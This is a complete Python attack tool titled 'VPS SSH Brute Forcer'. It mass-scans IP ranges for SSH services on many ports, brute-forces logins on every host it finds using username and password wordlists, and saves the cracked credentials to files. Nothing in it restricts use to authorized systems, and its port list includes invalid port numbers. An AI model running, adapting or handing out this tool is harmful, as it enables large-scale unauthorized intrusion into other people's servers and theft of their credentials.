#!/usr/bin/env python3
"""
VPS SSH BRUTE FORCER - Port Scanner + Brute Forcer
First scans IPs for open SSH ports, then brute forces all found SSH services
Author: Security Research
"""

import socket
import threading
import paramiko
import sys
import time
import queue
import random
import os
import ipaddress
from datetime import datetime

class VPSScannerBruteforcer:
    def __init__(self, threads=100, timeout=3):
        self.threads = threads
        self.timeout = timeout
        self.scan_queue = queue.Queue()
        self.brute_queue = queue.Queue()
        self.open_ssh = []
        self.found_creds = []
        self.lock = threading.Lock()
        self.scanning = True
        self.brute_running = True
        self.total_scanned = 0
        self.total_found = 0
        self.start_time = None
        self.total_targets = 0
        
        # Common SSH ports to scan
        self.ssh_ports = [
            22, 2222, 22222, 222222,  # Standard SSH
            2022, 2200, 222, 2222,     # Alternative SSH
            443, 4443, 4444,            # HTTPS masquerading
            80, 8080, 8443,              # HTTP masquerading
            9922, 992, 22222,            # Other common
            30000, 3000, 5000, 6000,     # Development ports
            10022, 10000, 20000, 20022,  # High ports
            22, 2222, 22222, 2222222,    # Progressive
            22222, 222222, 2222222,       # More variations
            2222, 22222, 222222, 22,      # Common patterns
        ]
        
        # Remove duplicates
        self.ssh_ports = list(set(self.ssh_ports))
        self.ssh_ports.sort()
        
        # Default usernames
        self.default_usernames = [
            'root', 'admin', 'user', 'ubuntu', 'centos', 
            'debian', 'fedora', 'oracle', 'ec2-user', 'azureuser',
            'pi', 'vagrant', 'test', 'guest', 'ftp',
            'www-data', 'nginx', 'apache', 'mysql', 'postgres',
            'tomcat', 'git', 'docker', 'kali', 'backup',
            'support', 'administrator', 'Administrator', 'guest'
        ]
        
        self.print_banner()
    
    def print_banner(self):
        print("""\033[91m
╔═══════════════════════════════════════════════════════════════════════╗
║              VPS SSH BRUTE FORCER - Port Scanner Edition             ║
║         Step 1: Scan IPs for open SSH ports                          ║
║         Step 2: Brute force all discovered SSH services              ║
╚═══════════════════════════════════════════════════════════════════════╝\033[0m""")
    
    def generate_ip_range(self, ip_input):
        """Generate IP range from various input formats"""
        ips = []
        
        try:
            # Check if it's a file
            if os.path.isfile(ip_input):
                with open(ip_input, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            ips.append(line)
                print(f"\033[92m[+] Loaded {len(ips)} IPs from file\033[0m")
                return ips
            
            # Check if it's CIDR notation (e.g., 192.168.1.0/24)
            if '/' in ip_input:
                network = ipaddress.ip_network(ip_input, strict=False)
                for ip in network.hosts():
                    ips.append(str(ip))
                print(f"\033[92m[+] Generated {len(ips)} IPs from CIDR {ip_input}\033[0m")
                return ips
            
            # Check if it's a range (e.g., 192.168.1.1-254)
            if '-' in ip_input and not ip_input.startswith('http'):
                parts = ip_input.split('-')
                if len(parts) == 2:
                    base = parts[0].rsplit('.', 1)[0]
                    start = int(parts[0].split('.')[-1])
                    end = int(parts[1])
                    
                    for i in range(start, end + 1):
                        ips.append(f"{base}.{i}")
                    print(f"\033[92m[+] Generated {len(ips)} IPs from range {ip_input}\033[0m")
                    return ips
            
            # Single IP
            ips.append(ip_input)
            return ips
            
        except Exception as e:
            print(f"\033[91m[-] Error generating IP range: {e}\033[0m")
            return []
    
    def scan_port(self, ip, port):
        """Scan a single port on an IP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                # Port open - try to get banner
                try:
                    sock.settimeout(2)
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    sock.close()
                    
                    # Check if it's SSH
                    if ('SSH' in banner or 'ssh' in banner.lower() or 
                        'OpenSSH' in banner or 'dropbear' in banner.lower()):
                        
                        with self.lock:
                            self.open_ssh.append({
                                'ip': ip,
                                'port': port,
                                'banner': banner[:100]
                            })
                        
                        print(f"\033[92m[✓] SSH FOUND: {ip}:{port} - {banner[:50]}\033[0m")
                        return True
                    else:
                        # Port open but not SSH
                        print(f"\033[90m[ ] {ip}:{port} - Not SSH ({banner[:20]})\033[0m")
                        
                except:
                    # No banner but port open - possible SSH
                    with self.lock:
                        self.open_ssh.append({
                            'ip': ip,
                            'port': port,
                            'banner': 'Unknown (no banner)'
                        })
                    print(f"\033[93m[?] POSSIBLE SSH: {ip}:{port} (no banner)\033[0m")
                    return True
            else:
                # Port closed
                pass
            
            sock.close()
            
        except socket.timeout:
            pass
        except Exception:
            pass
        
        return False
    
    def scanner_worker(self, ports):
        """Worker thread for scanning IPs"""
        while self.scanning:
            try:
                ip = self.scan_queue.get(timeout=1)
                
                with self.lock:
                    self.total_scanned += 1
                
                # Show progress
                if self.total_scanned % 10 == 0:
                    elapsed = time.time() - self.start_time if self.start_time else 0
                    rate = self.total_scanned / elapsed if elapsed > 0 else 0
                    remaining = self.total_targets - self.total_scanned
                    eta = remaining / rate if rate > 0 else 0
                    
                    print(f"\r\033[94m[*] Scanning: {self.total_scanned}/{self.total_targets} IPs | Found SSH: {len(self.open_ssh)} | Rate: {rate:.1f}/s | ETA: {eta:.0f}s\033[0m", end='')
                
                # Scan all ports for this IP
                for port in ports:
                    if not self.scanning:
                        break
                    self.scan_port(ip, port)
                
                self.scan_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                continue
    
    def load_usernames(self, filepath):
        """Load usernames from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
            print(f"\033[92m[+] Loaded {len(usernames)} usernames from {filepath}\033[0m")
            return usernames
        except Exception as e:
            print(f"\033[91m[-] Error loading usernames: {e}\033[0m")
            return self.default_usernames
    
    def load_passwords(self, filepath):
        """Load passwords from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"\033[92m[+] Loaded {len(passwords)} passwords from {filepath}\033[0m")
            return passwords
        except Exception as e:
            print(f"\033[91m[-] Error loading passwords: {e}\033[0m")
            return []
    
    def ssh_connect(self, ip, port, username, password):
        """Attempt SSH connection"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                ip,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout,
                compress=False
            )
            
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException:
            return False
        except socket.timeout:
            return False
        except socket.error:
            return False
        except Exception:
            return False
    
    def brute_worker(self, usernames, passwords):
        """Worker thread for brute forcing"""
        while self.brute_running:
            try:
                target = self.brute_queue.get(timeout=1)
                ip = target['ip']
                port = target['port']
                banner = target.get('banner', 'Unknown')
                
                print(f"\n\033[94m[*] Attacking: {ip}:{port} [{banner[:30]}]\033[0m")
                
                attempts = 0
                found = False
                total_attempts = len(usernames) * len(passwords)
                
                for username in usernames:
                    if not self.brute_running or found:
                        break
                    
                    for password in passwords:
                        if not self.brute_running or found:
                            break
                        
                        attempts += 1
                        
                        # Show progress
                        if attempts % 20 == 0:
                            percent = (attempts / total_attempts) * 100
                            print(f"\033[90m    Progress: {attempts}/{total_attempts} ({percent:.1f}%) - Trying: {username}:{password}\033[0m", end='\r')
                        else:
                            print(f"\033[90m    Trying: {username}:{password}\033[0m", end='\r')
                        
                        if self.ssh_connect(ip, port, username, password):
                            result = f"\n\033[92m[🔥] SUCCESS! {ip}:{port} - {username}:{password}\033[0m"
                            print(result)
                            
                            with self.lock:
                                self.found_creds.append({
                                    'ip': ip,
                                    'port': port,
                                    'username': username,
                                    'password': password,
                                    'banner': banner
                                })
                            
                            # Save immediately
                            self.save_result(ip, port, username, password)
                            
                            found = True
                            break
                        
                        # Small delay
                        time.sleep(0.03)
                
                self.brute_queue.task_done()
                
                if not found:
                    print(f"\n\033[91m[-] Failed: {ip}:{port} - No valid credentials\033[0m")
                
            except queue.Empty:
                break
            except Exception as e:
                continue
    
    def save_result(self, ip, port, username, password):
        """Save found credentials"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open('ssh_found.txt', 'a') as f:
            f.write(f"[{timestamp}] {ip}:{port} - {username}:{password}\n")
    
    def save_open_ssh(self):
        """Save open SSH hosts"""
        with open('ssh_open.txt', 'w') as f:
            f.write(f"# Open SSH hosts found - {datetime.now()}\n")
            f.write(f"# Total: {len(self.open_ssh)}\n\n")
            for ssh in self.open_ssh:
                f.write(f"{ssh['ip']}:{ssh['port']} | {ssh['banner']}\n")
    
    def print_summary(self):
        """Print scan summary"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m📊 SCAN SUMMARY\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"IPs scanned: {self.total_scanned}")
        print(f"SSH hosts found: {len(self.open_ssh)}")
        print(f"Credentials found: {len(self.found_creds)}")
        print(f"Time elapsed: {elapsed:.1f} seconds")
        print(f"Scan rate: {self.total_scanned/elapsed:.1f} IPs/sec" if elapsed > 0 else "Scan rate: N/A")
        print(f"\033[96m{'='*60}\033[0m")
    
    def run(self):
        """Main execution"""
        self.start_time = time.time()
        
        print("\n\033[93m[?] Enter IP target (single IP, CIDR, range, or file):\033[0m")
        ip_input = input("> ").strip()
        
        if not ip_input:
            print("\033[91m[-] No target specified\033[0m")
            return
        
        # Generate IP list
        ip_list = self.generate_ip_range(ip_input)
        
        if not ip_list:
            print("\033[91m[-] No valid IPs generated\033[0m")
            return
        
        self.total_targets = len(ip_list)
        
        print(f"\n\033[92m[+] Total IPs to scan: {self.total_targets}\033[0m")
        print(f"\033[92m[+] SSH ports to check: {len(self.ssh_ports)}\033[0m")
        print(f"\033[92m[+] Total port scans: {self.total_targets * len(self.ssh_ports):,}\033[0m")
        
        # ===== PHASE 1: SCAN FOR SSH PORTS =====
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔍 PHASE 1: SCANNING FOR OPEN SSH PORTS\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"Threads: {self.threads}")
        print(f"Timeout: {self.timeout}s")
        print(f"\033[96m{'='*60}\033[0m\n")
        
        # Fill scan queue
        for ip in ip_list:
            self.scan_queue.put(ip)
        
        # Start scanner threads
        scanner_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.scanner_worker, args=(self.ssh_ports,))
            t.daemon = True
            t.start()
            scanner_threads.append(t)
        
        # Wait for scanning to complete
        try:
            self.scan_queue.join()
        except KeyboardInterrupt:
            print(f"\n\033[93m[!] Scan interrupted\033[0m")
            self.scanning = False
        
        self.scanning = False
        
        # Save open SSH hosts
        self.save_open_ssh()
        
        # Print summary
        self.print_summary()
        
        if not self.open_ssh:
            print(f"\033[91m[-] No open SSH hosts found. Exiting.\033[0m")
            return
        
        # Load wordlists
        print(f"\n\033[93m[?] Enter username list file (or press Enter for defaults):\033[0m")
        username_file = input("> ").strip()
        
        print(f"\033[93m[?] Enter password list file:\033[0m")
        password_file = input("> ").strip()
        
        if not password_file:
            print("\033[91m[-] Password list required\033[0m")
            return
        
        usernames = self.load_usernames(username_file) if username_file else self.default_usernames
        passwords = self.load_passwords(password_file)
        
        if not passwords:
            print("\033[91m[-] No passwords loaded\033[0m")
            return
        
        # ===== PHASE 2: BRUTE FORCE =====
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔥 PHASE 2: BRUTE FORCING {len(self.open_ssh)} SSH HOSTS\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"Usernames: {len(usernames)}")
        print(f"Passwords: {len(passwords)}")
        total_attempts = len(self.open_ssh) * len(usernames) * len(passwords)
        print(f"Total attempts: {total_attempts:,}")
        print(f"\033[96m{'='*60}\033[0m\n")
        
        # Ask to proceed
        proceed = input(f"\033[93m[?] Proceed with brute force? (y/n): \033[0m").lower()
        if proceed != 'y':
            print(f"\033[91m[-] Exiting\033[0m")
            return
        
        # Fill brute queue
        for ssh in self.open_ssh:
            self.brute_queue.put(ssh)
        
        # Start brute threads
        brute_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.brute_worker, args=(usernames, passwords))
            t.daemon = True
            t.start()
            brute_threads.append(t)
        
        # Monitor brute progress
        try:
            while not self.brute_queue.empty():
                time.sleep(5)
                remaining = self.brute_queue.qsize()
                completed = len(self.open_ssh) - remaining
                percent = (completed / len(self.open_ssh)) * 100 if len(self.open_ssh) > 0 else 0
                
                attempts_made = completed * len(usernames) * len(passwords)
                total_attempts_progress = (attempts_made / total_attempts) * 100 if total_attempts > 0 else 0
                
                print(f"\r\033[94m[*] Progress: {completed}/{len(self.open_ssh)} hosts ({percent:.1f}%) | Found: {len(self.found_creds)} | Total attempts: {total_attempts_progress:.1f}%\033[0m", end='')
        except KeyboardInterrupt:
            print(f"\n\033[93m[!] Brute force interrupted\033[0m")
            self.brute_running = False
        
        self.brute_running = False
        
        # ===== FINAL RESULTS =====
        print(f"\n\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m📊 FINAL RESULTS\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        
        if self.found_creds:
            print(f"\n\033[92m[🔥] CREDENTIALS FOUND: {len(self.found_creds)}\033[0m")
            print(f"\033[96m{'-'*60}\033[0m")
            for i, cred in enumerate(self.found_creds, 1):
                print(f"{i:2}. {cred['ip']:15}:{cred['port']:<5} | {cred['username']}:{cred['password']}")
            
            # Save final credentials
            with open('ssh_creds_final.txt', 'w') as f:
                f.write(f"# SSH Credentials Found - {datetime.now()}\n")
                f.write(f"# Total: {len(self.found_creds)}\n\n")
                for cred in self.found_creds:
                    f.write(f"{cred['ip']}:{cred['port']} | {cred['username']}:{cred['password']}\n")
        else:
            print(f"\n\033[91m[-] No credentials found\033[0m")
        
        print(f"\n\033[92m[+] Results saved to:\033[0m")
        print(f"    - ssh_open.txt (all discovered SSH hosts)")
        print(f"    - ssh_found.txt (credentials found during attack)")
        print(f"    - ssh_creds_final.txt (final credentials list)")

def main():
    """Main function"""
    
    # Check for paramiko
    try:
        import paramiko
    except ImportError:
        print("\033[91m[-] Paramiko not installed. Install with: pip install paramiko\033[0m")
        sys.exit(1)
    
    # Parse arguments
    import argparse
    parser = argparse.ArgumentParser(description='VPS SSH Brute Forcer - Scanner + Attacker')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('--timeout', type=int, default=3, help='Connection timeout (default: 3)')
    
    args = parser.parse_args()
    
    # Create and run brute forcer
    brute = VPSScannerBruteforcer(threads=args.threads, timeout=args.timeout)
    
    try:
        brute.run()
    except KeyboardInterrupt:
        print(f"\n\033[93m[!] Program interrupted by user\033[0m")
        brute.print_summary()
        sys.exit(0)

if __name__ == "__main__":
    main()
